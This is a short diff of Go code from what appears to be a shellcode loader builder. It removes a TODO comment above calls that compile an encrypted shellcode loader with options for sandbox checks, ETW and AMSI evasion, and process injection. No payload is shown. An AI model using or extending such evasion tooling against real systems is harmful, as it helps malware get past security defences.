@@ -225,7 +225,6 @@ func main() {
 	b64key := base64.StdEncoding.EncodeToString(key)
 	b64iv := base64.StdEncoding.EncodeToString(iv)
 	fmt.Println("[+] Shellcode Encrypted")
-	//TODO modify CompileFile and Loader to include opt.sandboxDomain
 	name, filename := Loader.CompileFile(b64ciphertext, b64key, b64iv, opt.LoaderType, opt.outFile, opt.refresher, opt.console, opt.sandbox, opt.sandboxDomain, opt.ETW, opt.ProcessInjection, opt.sleep, opt.AMSI)
 	name = execute(opt, name)
 	Loader.CompileLoader(opt.LoaderType, opt.outFile, filename, name, opt.CommandLoader, opt.URL, opt.sandbox, opt.Sha, opt.path)
